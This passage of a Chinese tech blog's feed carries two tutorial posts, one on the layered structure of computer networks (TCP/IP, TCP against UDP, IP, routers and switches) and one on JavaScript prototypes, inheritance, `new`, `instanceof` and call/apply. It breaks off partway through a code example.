    <content type="html"><![CDATA[<h1 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h1><p><a href="https://imgtu.com/i/btcX1U"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btcX1U.png" alt="btcX1U.png"></a></p><p><a href="https://imgtu.com/i/q8fbgs"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/24/q8fbgs.png" alt="q8fbgs.png"></a></p><p>TCP/IP体系结构相当于将OSI体系结构的<strong>物理层</strong>和<strong>数据链路层</strong>合并为了<strong>网络接口层</strong>，并去掉了<strong>会话层</strong>和<strong>表示层</strong>。</p><p>教学时经常把TCP/IP体系结构的<strong>网络接口层</strong>分成了<strong>物理层</strong>和<strong>数据链路层</strong>。</p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>最上层的，也是我们能直接接触到的就是<strong>应用层(Application Layer)<strong>，我们电脑或手机使用的应用软件都是在应用层实现。那么，当两个不同设备的应用需要通信的时候，应用就把应用数据传给下一层，也就是</strong>传输层</strong>。</p><p>所以，<strong>应用层只需要专注于为用户提供应用功能，不用去关心数据是如何传输的</strong>，就类似于，我们寄快递的时候，只需要把包裹交给快递员，由他负责运输快递，我们不需要关心快速是如何被运输的。</p><p>而且<strong>应用层是工作在操作系统中的用户态</strong>，<strong>传输层及以下则工作在内核态</strong>。</p><p>对于不同的网络应用需要不同的应用层协议。在互联网中应用层协议很多，如域名系统DNS，支持万维网应用的HTTP协议，支持电子邮件的SMTP协议等等。我们把应用层交互的数据单元称为报文。</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>应用层的数据包会传给传输层，<strong>传输层(Transport Layer)是为应用层提供网络支持的。</strong></p><p>在传输层会有两个传输协议，分别是<strong>TCP</strong>和<strong>UDP</strong>。</p><p>TCP的全称叫**传输层控制协议（Transmission Control Protocol)**，大部分应用使用的正是TCP传输层协议，比如HTTP应用层协议。</p><p>TCP相比 UDP多了很多特性，比如<strong>流量控制</strong>、<strong>超时重传</strong>、<strong>拥塞控制</strong>等，这些都是为了<strong>保证数据包能可靠地传输给对方</strong>。</p><p>UDP就相对很简单，简单到只负责发送数据包，<strong>不保证数据包是否能抵达对方</strong>，但它<strong>实时性相对更好</strong>，<strong>传输效率也高</strong>。</p><p>当然，UDP也可以实现可靠传输，把TCP的特性在应用层上实现就可以，不过要实现一个商用的可靠UDP传输协议，也不是一件简单的事情。</p><p>应用需要传输的数据可能会非常大，如果直接传输就不好控制，因此当传输层的数据包大小超过MSS(TCP最大报文段长度) ﹐就要将数据包分块，这样即使中途有一个分块丢失或损坏了，只需要重新发送这一个分块，而不用重新发送整个数据包。在TCP协议中，我们把每个分块称为一个**TCP段(TCP Segment)**。</p><p>当设备作为接收方时，传输层则要负责把数据包传给应用，但是一台设备上可能会有很多应用在接收或者传输数据，因此需要用一个编号将应用区分开来，这个编号就是<strong>端口</strong>。</p><p>比如<strong>80端口</strong>通常是<strong>Web服务器</strong>用的，<strong>22端口</strong>通常是远程登录服务器用的。而对于浏览器（(客户端）中的每个标签栏都是一个独立的进程，操作系统会为这些进程分配临时的端口号。</p><p>由于传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用。</p><blockquote><p>TCP和UDP</p></blockquote><p>UDP 在传送数据之前<strong>不需要先建立连接</strong>，远地主机在收到 UDP 报文后，<strong>不需要给出任何确认</strong>。虽然 UDP 不提供可靠交付，但在某些情况下 UDP 却是一种最有效的工作方式（<strong>一般用于即时通信</strong>），比如： QQ语音、 QQ视频 、直播等等</p><p>TCP 提供<strong>面向连接</strong>的服务。在<strong>传送数据之前必须先建立连接，数据传送结束后要释放连接</strong>。 TCP 不提供广播或多播服务。由于 TCP 要提供<strong>可靠的，面向连接</strong>的传输服务（TCP 的可靠体现在 TCP 在传递数据之前，会有<strong>三次握手</strong>来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源），这难免增加了许多开销，如确认，流量控制，计时器以及连接管理等。这不仅使协议数据单元的首部增大很多，还要占用许多处理机资源。TCP 一般用于<strong>文件传输、发送和接收邮件、远程登录</strong>等场景。</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>传输层可能大家刚接触的时候，会认为它负责将数据从一个设备传输到另一个设备，事实上它并不负责。</p><p>实际场景中的网络环节是错综复杂的，中间有各种各样的线路和分叉路口，如果一个设备的数据要传输给另一个设备，就需要在各种各样的路径和节点进行选择，而传输层的设计理念是简单、高效、专注，如果传输层还负责这一块功能就有点违背设计原则了。</p><p>也就是说，我们不希望传输层协议处理太多的事情，<strong>只需要服务好应用即可，让其作为应用间数据传输的媒介，帮助实现应用到应用的通信，而实际的传输功能就交给下一层</strong>，也就是<strong>网络层(Internet Layer)</strong> 。</p><p>网络层最常使用的是<strong>IP协议(Internet Protocol)</strong> , IP协议会将传输层的报文作为数据部分，再加上IP包头组装成IP报文，如果IP报文大小超过MTU(以太网中一般为1500字节）就会<strong>再次进行分片</strong>，得到一个即将发送到网络的IP报文。</p><p><a href="https://imgtu.com/i/btgA1O"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btgA1O.png" alt="btgA1O.png"></a></p><p>网络层负责将数据从一个设备传输到另一个设备，世界上那么多设备，又该如何找到对方呢?因此，网络层需要有区分设备的编号。</p><p>我们一般用<strong>IP地址</strong>给设备进行编号，对于<strong>IPv4</strong>协议，IP地址共<strong>32</strong>位，分成了四段，每段是<strong>8</strong>位。只有一个单纯的IP地址虽然做到了区分设备，但是寻址起来就特别麻烦，全世界那么多台设备，难道一个一个去匹配?这显然不科学。</p><p>因此，需要将IP地址分成两种意义∶</p><ul><li>一个是<strong>网络号</strong>，负责标识该IP地址是属于哪个子网的;</li><li>一个是<strong>主机号</strong>，负责标识同一子网下的不同主机;</li></ul><p>怎么分的呢?这需要配合<strong>子网掩码</strong>才能算出IP地址的网络号和主机号。那么在寻址的过程中，先匹配到相同的网络号，才会去找对应的主机。</p><p>除了寻址能力，IP协议还有另一个重要的能力就是<strong>路由</strong>。实际场景中，两台设备并不是用一条网线连接起来的，而是通过很多网关、路由器、交换机等众多网络设备连接起来的，那么就会形成很多条网络的路径，因此当数据包到达一个网络节点，就需要通过算法决定下一步走哪条路径。</p><p>所以，<strong>IP协议的寻址作用是告诉我们去往下一个目的地该朝哪个方向走，路由则是根据「下一个目的地」选择路径。寻址更像在导航，路由更像在操作方向盘。</strong></p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>实际场景中，网络并不是一个整体，比如你家和我家就不属于一个网络，所以数据不仅可以在同一个网络中设备间进行传输，也可以跨网络进行传输。</p><p>一旦数据需要跨网络传输，就需要有一个设备同时在两个网络当中，这个设备一般是路由器，路由器可以通过路由表计算出下一个要去的IP地址。</p><p>那问题来了，路由器怎么知道这个IP地址是哪个设备的呢?</p><p>于是，就需要有一个专门的层来标识网络中的设备，让数据在一个链路中传输，这就是<strong>数据链路层(Data LinkLayer)</strong> ，它主要为网络层提供链路级别传输的服务。</p><p>每一台设备的网卡都会有一个MAC地址，它就是用来唯一标识设备的。<strong>路由器计算出了下一个目的地IP地址，再通过ARP协议找到该目的地的MAC地址，这样就知道这个IP地址是哪个设备的了。</strong></p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>当数据准备要从设备发送到网络时，需要把数据包转换成电信号，让其可以在物理介质中传输，这一层就是<strong>物理层(Phvsical Laver)</strong> ，它主要是为数据链路层提供二进制传输的职务。</p><h3 id="为什么网络要分层？"><a href="#为什么网络要分层？" class="headerlink" title="为什么网络要分层？"></a>为什么网络要分层？</h3><ol><li><strong>各层之间相互独立</strong>：各层之间相互独立，各层之间不需要关心其他层是如何实现的，只需要知道自己如何调用下层提供好的功能就可以了（可以简单理解为接口调用）<strong>。这个和我们对开发时系统进行分层是一个道理。</strong></li><li><strong>提高了整体灵活性</strong> ：每一层都可以使用最适合的技术来实现，你只需要保证你提供的功能以及暴露的接口的规则没有改变就行了。<strong>这个和我们平时开发系统的时候要求的高内聚、低耦合的原则也是可以对应上的。</strong></li><li><strong>大问题化小</strong> ： 分层可以将复杂的网络间题分解为许多比较小的、界线比较清晰简单的小问题来处理和解决。这样使得复杂的计算机网络系统变得易于设计，实现和标准化。 <strong>这个和我们平时开发的时候，一般会将系统功能分解，然后将复杂的问题分解为容易理解的更小的问题是相对应的，这些较小的问题具有更好的边界（目标和接口）定义。</strong></li></ol><p>我想到了计算机世界非常非常有名的一句话，这里分享一下：</p><blockquote><p>计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决，计算机整个体系从上到下都是按照严格的层次结构设计的。</p></blockquote><h3 id="路由器和交换机的主要区别"><a href="#路由器和交换机的主要区别" class="headerlink" title="路由器和交换机的主要区别"></a>路由器和交换机的主要区别</h3><h4 id="MAC模块的区别"><a href="#MAC模块的区别" class="headerlink" title="MAC模块的区别"></a>MAC模块的区别</h4><p>路由器和交换机不同点在于，它的<strong>每个网口下，都有一个MAC地址和IP地址</strong>。</p><p>正因为路由器具有 MAC 地址，因此它能够成为数据链路层的的<strong>发送方和接收方</strong>。</p><p>交换机，是<strong>不具备MAC地址</strong>的，而<strong>MAC报头</strong>是需要填上目的MAC地址的。因此交换机从来都不是数据的目的地，它只简单转发数据帧到<strong>目的地</strong>。</p><p>但路由器，是有MAC地址的，因此MAC报头就可以写上，下一站目的地就是xx路由。</p><p>到了路由器后，路由器可以再次组装下一站的目的MAC地址是再下一个路由，通过这一点，让数据在路由和路由之间传输。</p><p>而同时因为交换机不具有MAC地址，因此也不会校验收到的数据帧的MAC地址是不是自己的，全部收下做转发。而路由器则会校验数据帧的MAC报头里的目的MAC地址是不是自己，是的话才会收入内存缓冲区，否则丢弃。</p><h4 id="找不到转发目的地时的处理方式有区别"><a href="#找不到转发目的地时的处理方式有区别" class="headerlink" title="找不到转发目的地时的处理方式有区别"></a>找不到转发目的地时的处理方式有区别</h4><p>如果在路由表中无法找到匹配的记录，<strong>路由器会丢弃这个包，并通过 ICMP消息告知发送方</strong>。</p><p>而交换机在<strong>MAC地址表</strong>里<strong>找不到转发端口时会选择广播</strong>。</p><p>这里的处理方式两者是不同的，原因在于<strong>网络规模的大小</strong>。</p><p>交换机连接的网络最多也就是几千台设备的规模，这个规模并不大。如果只有几千台设备，遇到不知道应该转发到哪里的包，交换机可以将包发送到所有的端口上，虽然这个方法很简单粗暴，但不会引发什么问题。</p><p>但路由器工作的网络环境就是<strong>互联网</strong>，全世界所有的设备都连接在互联网上，规模非常大，并且这个规模还在持续扩大中。如果此时它的操作跟交换机一样，将不知道应该转发到哪里的包发送到整个网络上，那就会产生大量的网络包，造成网络拥塞。因此，路由器遇到不知道该转发到哪里的包， 就会直接丢弃。</p><h4 id="路由器和光猫有什么区别"><a href="#路由器和光猫有什么区别" class="headerlink" title="路由器和光猫有什么区别"></a>路由器和光猫有什么区别</h4><p>不管是交换机还是路由器，前面都是提到网口输入的是<strong>电信号</strong>。但现在流行的是<strong>光纤传输</strong>，传输的是<strong>光信号</strong>。</p><p>而<strong>光猫</strong>（modem），是一种调制解调器，其实就是用于<strong>光电信号转换</strong>的设备。</p><p>接收数据时，可以将光纤里的<strong>光信号转化为电信号</strong>，发给路由器，路由器内部再转成数字信号，并在此基础上做各种处理。</p><p>相反，也会把路由器传来的<strong>电信号转为光信号</strong>，发到光纤，并进入互联网。</p><h3 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h3><p>两台电脑可以通过一根<strong>网线</strong>直接连接，进行通信。</p><p>机器一多，可以把网线都接到<strong>集线器</strong>（物理层）上，但是集线器会不管三七二十一进行<strong>广播</strong>。</p><p>不想广播，可以用（二层）<strong>交换机</strong>（数据链路层），又叫多端口网桥，它比较聪明，会自我学习生产MAC地址表，知道消息发到哪，那就<strong>不需要广播</strong>啦。</p><p>互联网电脑这么多，交换机MAC地址表总不能全放下吧。改用<strong>路由器</strong>（网络层），也叫三层交换机，通过网段的方式定位要把消息转发到哪，就不需要像交换机那样苦哈哈一条条记录MAC地址啦。</p><p>路由器和光猫之间是好搭档，<strong>光猫</strong>负责把光纤里的光信号转换成电信号给路由器。</p><p>现在一般情况下，家里已经不用集线器和交换机了，<strong>大部分路由器也支持交换机的功能</strong>。所以可以看到，家里的台式机电脑一般就连到一个路由器，再连个光猫就够能快乐上网了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机网络体系结构&quot;&gt;&lt;a href=&quot;#计算机网络体系结构&quot; class=&quot;headerlink&quot; title=&quot;计算机网络体系结构&quot;&gt;&lt;/a&gt;计算机网络体系结构&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://imgtu.com/i/btcX1U&quot;&gt;&lt;img </summary>
      
    
    
    
    <category term="浏览器" scheme="https://lesliewaong.top/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="应用层" scheme="https://lesliewaong.top/tags/%E5%BA%94%E7%94%A8%E5%B1%82/"/>
    
    <category term="传输层" scheme="https://lesliewaong.top/tags/%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
    
    <category term="网络层" scheme="https://lesliewaong.top/tags/%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
    
  </entry>
  
  <entry>
    <title>原型和继承</title>
    <link href="https://lesliewaong.top/posts/24025dd2.html"/>
    <id>https://lesliewaong.top/posts/24025dd2.html</id>
    <published>2022-02-20T11:12:22.000Z</published>
    <updated>2022-03-25T14:08:26.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原型和继承"><a href="#原型和继承" class="headerlink" title="原型和继承"></a>原型和继承</h1><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><p>每个函数都有一个属性<code>prototype</code>，它指向函数的原型，默认情况下它是一个普通<code>Object</code>对象。</p><p><strong>调用该构造函数所创建的实例的隐式原型指向该构造函数的原型对象。</strong></p><p>JS同样存在由<strong>原型指向构造函数的属性</strong>：<code>constructor</code>，即<code>Func.prototype.constructor --&gt; Func</code></p><p>JS中所有对象(除了<code>null</code>)都具有一个<code>__proto__</code>属性，该属性指向该对象的隐式原型。</p><p><a href="https://imgtu.com/i/Tkh7H1"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2021/12/17/Tkh7H1.png" alt="Tkh7H1.png"></a></p><p><code>JavaScript</code>所有的对象本质上都是通过<code>new 函数</code>创建的，包括对象字面量的形式定义对象(相当于<code>new Object()</code>的语法糖)。</p><p><strong>所有的函数</strong>本质上都是通过<code>new Function</code>创建的，包括<code>Object</code>、<code>Array</code>等。<strong>所有的函数都是对象</strong>。</p><p><strong>实例对象</strong>在查找属性时，如果查找不到，就会沿着<code>__proto__</code>去与对象关联的原型上查找，如果还查找不到，就去找原型的原型，直至查到最顶层，这也就是<strong>原型链</strong>的概念。</p><p><a href="https://imgtu.com/i/TkhJ0I"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2021/12/17/TkhJ0I.png" alt="TkhJ0I.png"></a></p><ul><li><p>所有函数(包括<code>Function</code>)的<code>__proto__</code>指向<code>Function.prototype</code></p></li><li><p>自定义对象实例的<code>__proto__</code>指向构造函数的原型</p></li><li><p>函数的<code>prototype</code>的<code>__proto__</code>指向<code>Object.prototype</code></p></li><li><p><code>Object.prototype.__proto__ --&gt; null</code></p></li></ul><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承是一种代码复用的方式。在面向对象编程中，继承是一个很重要的点。</p><p>在JS中继承背后的原理是原型<code>prototype</code>, 这种实现继承的方式，我们称之为原型继承。</p><h3 id="全局对象"><a href="#全局对象" class="headerlink" title="全局对象"></a>全局对象</h3><p>JS中一些全局内置函数，分别为Functon, Array, Object.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>); <span class="comment">// -&gt; ƒ Object() &#123; [native code] &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>); <span class="comment">// -&gt; ƒ Array() &#123; [native code] &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>); <span class="comment">// -&gt; ƒ Function() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure><ul><li>所有的数组对象，都是由全局内置函数Array创建的</li><li>所有的object对象，都是由全局内置函数Object创建的</li><li>所有的函数对象，都是由全局内置函数Function创建的</li></ul><p>其他也是同理，比如:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>.__proto__ === <span class="built_in">Number</span>.prototype; <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;.__proto__ === String.prototype; // true</span></span><br><span class="line"><span class="string">true.__proto__ === Boolean.prototype; // true</span></span><br></pre></td></tr></table></figure><h3 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h3><p><code>__proto__</code>是一个内部属性，不建议对其进行直接操作。 而是建议通过<code>prototype</code>来进行操作。</p><p>一个对象的<code>__proto__</code>总是指向它的构造函数的<code>prototype</code>。</p><blockquote><p>构造函数指的是创建这个对象的函数， 比如 foo = new Foo(), 那么Foo就是foo的构造函数。</p></blockquote><p>让我们来继续看一下上面的代码, 就不难理解了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>.__proto__ === <span class="built_in">Number</span>.prototype; <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;.__proto__ === String.prototype; // true</span></span><br><span class="line"><span class="string">true.__proto__ === Boolean.prototype; // true</span></span><br></pre></td></tr></table></figure><p>除此我们需要注意一点，那就是<code>Object.prototype.__proto__</code> 值为 <code>null</code>。 其实也就是<strong>继承链的终点</strong>。</p><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>为了能够明白原型链和继承，我们首先要知道“属性查找机制”。</p><p>当我们访问一个对象的属性的时候，引擎首先会在当前对象进行查找，如果找不到就会访问该对象的<code>__proto__</code>， 如果<code>__proto__</code>有了，就返回，如果没有则递归执行上述过程，直到<code>__proto__</code> 为 <code>null</code>。</p><p>继承的过程，直接依靠的是<code>__proto__</code>， 只不过就像我上面提到的<code>__proto__</code> 只是一个指向构造函数原型的引用， 因此开发人员修改了构造函数的原型，就会影响到<code>__proto__</code>， 进而影响了对象的原型链。</p><p>当然你可以自己直接修改<code>__proto__</code>，但是不推荐！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.__proto__.nickName = <span class="string">&#x27;lucifer&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj); <span class="comment">// -&gt; &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.nickName); <span class="comment">// -&gt; lucifer</span></span><br></pre></td></tr></table></figure><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><p>其实继承和原型这部分知识和new是强相关的。 我们有必要了解一下new的原理。</p><p>new 的原理很简单, 就是引擎内部新建一个空对象，然后将这个空对象的<code>__proto__</code> 指向构造函数的<code>prototype</code>.然后调用构造函数，去填充我们创建的空对象(如果有必要)。 最后将<code>this</code>指向我们刚刚创建的新对象。</p><p><strong>new 运算符</strong>创建一个用户定义的对象类型的实例或具有构造函数的内置对象的实例。<strong>new</strong> 关键字会进行如下的操作：</p><ol><li>创建一个空的简单JavaScript对象（即<code>&#123;&#125;</code>）；</li><li>将该对象的<code>__proto__</code>指向构造函数原型；</li><li>将步骤1新创建的对象作为<code>this</code>的上下文 ；</li><li>如果<strong>该函数没有返回对象</strong>，则返回<code>this</code>（新创建的对象）。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_object</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 创建一个空的对象</span></span><br><span class="line">  <span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line">  <span class="comment">// 获得构造函数</span></span><br><span class="line">  <span class="keyword">let</span> Con = [].shift.call(<span class="built_in">arguments</span>)</span><br><span class="line">  <span class="comment">// 链接到原型 （不推荐使用）</span></span><br><span class="line">  obj.__proto__ = Con.prototype</span><br><span class="line">  <span class="comment">// 绑定 this，执行构造函数</span></span><br><span class="line">  <span class="keyword">let</span> result = Con.apply(obj, <span class="built_in">arguments</span>)</span><br><span class="line">  <span class="comment">// 确保 new 出来的是个对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> result === <span class="string">&#x27;object&#x27;</span> ? result : obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>__proto__</code><strong>已废弃:</strong> 该特性已经从 Web 标准中删除，虽然一些浏览器目前仍然支持它，但也许会在未来的某个时间停止支持，请尽量不要使用该特性。</p><p><code>Object.setPrototypeOf(obj, proto);</code>直接修改已有对象的原型，非常耗时。</p><p><strong>警告:</strong> 通过现代浏览器的操作属性的便利性，可以改变一个对象的 <code>[[Prototype]]</code> 属性, 这种行为在每一个JavaScript引擎和浏览器中都是一个非常慢且影响性能的操作，使用这种方式来改变和继承属性是对性能影响非常严重的，并且性能消耗的时间也不是简单的花费在 <code>obj.__proto__ = ...</code> 语句上, 它还会影响到所有继承来自该 <code>[[Prototype]]</code> 的对象，如果你关心性能，你就不应该在一个对象中修改它的 <code>[[Prototype]]</code>。相反, 创建一个新的且可以继承 <code>[[Prototype]]</code> 的对象，推荐使用 <code>Object.create()</code></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 优化后 new 实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1、通过call，this指向了arguments(封装实参的对象)，shift删除并获得arguments中第一个参数——构造函数</span></span><br><span class="line">  Con = [].shift.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="comment">// 2、创建一个空的对象并将该对象的__proto__指向构造函数原型</span></span><br><span class="line">  <span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(Con.prototype);</span><br><span class="line">  <span class="comment">// 3、绑定 this 实现继承，obj 可以访问到构造函数中的属性</span></span><br><span class="line">  <span class="keyword">let</span> ret = Con.apply(obj, <span class="built_in">arguments</span>);</span><br><span class="line">  <span class="comment">// 4、优先返回构造函数返回的对象</span></span><br><span class="line">  <span class="keyword">return</span> ret <span class="keyword">instanceof</span> <span class="built_in">Object</span> ? ret : obj;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Car</span>(<span class="params">color</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.color = color;</span><br><span class="line">&#125;</span><br><span class="line">Car.prototype.start = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.color + <span class="string">&quot; car start&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> car = create(Car,<span class="string">&quot;black&quot;</span>);</span><br></pre></td></tr></table></figure><p>补充：</p><p><code>shift/unshift</code> 方法并不局限于数组：这个方法能够通过  <code>call()</code> 或 <code>apply()</code>方法作用于类似数组的对象上。</p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><ol><li><code>instanceof</code> 判断<strong>对象的原型链上是否存在构造函数的原型</strong>。只能判断引用类型。</li><li><code>instanceof</code> 常用来判断 <code>A</code> 是否为 <code>B</code> 的实例</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// instanceof 的内部实现 </span></span><br><span class="line"><span class="keyword">const</span> instance_of = <span class="function">(<span class="params">Case,Constructor</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 基本数据类型返回false</span></span><br><span class="line">    <span class="comment">// 兼容一下函数对象</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">typeof</span>(Case) !== <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span>(Case) !== <span class="string">&#x27;function&#x27;</span>) || Case === <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> CaseProto = <span class="built_in">Object</span>.getPrototypeOf(Case);</span><br><span class="line">    <span class="comment">// let CaseProto = Case.__proto__;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="comment">// 查到原型链顶端，仍未查到，返回false</span></span><br><span class="line">        <span class="keyword">if</span> (CaseProto === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 找到相同的原型</span></span><br><span class="line">        <span class="keyword">if</span> (CaseProto === Constructor.prototype) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// CaseProto = CaseProto.__proto__;</span></span><br><span class="line">        CaseProto = <span class="built_in">Object</span>.getPrototypeOf(CaseProto);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a=&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(instance_of(a,<span class="built_in">Object</span>))</span><br></pre></td></tr></table></figure><p><code>Object.getPrototypeOf()</code> 方法返回指定对象的原型（内部<code>[[Prototype]]</code>属性的值）。</p><h2 id="call-apply"><a href="#call-apply" class="headerlink" title="call/apply"></a>call/apply</h2><h3 id="Function-prototype-call"><a href="#Function-prototype-call" class="headerlink" title="Function.prototype.call()"></a>Function.prototype.call()</h3><p><code>call()</code> 方法调用一个函数, 其具有一个指定的 <code>this</code> 值和多个参数(<strong>参数的列表</strong>)。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func.call(thisArg, arg1, arg2, ...)</span><br></pre></td></tr></table></figure><p>它运行 <code>func</code>，提供的第一个参数 <code>thisArg</code> 作为 <code>this</code>，后面的作为参数。</p><p>看一个简单的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayWord</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> talk = [<span class="built_in">this</span>.name, <span class="string">&#x27;say&#x27;</span>, <span class="built_in">this</span>.word].join(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(talk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bottle = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;bottle&#x27;</span>, </span><br><span class="line">  <span class="attr">word</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 call 将 bottle 传递为 sayWord 的 this</span></span><br><span class="line">sayWord.call(bottle); </span><br><span class="line"><span class="comment">// bottle say 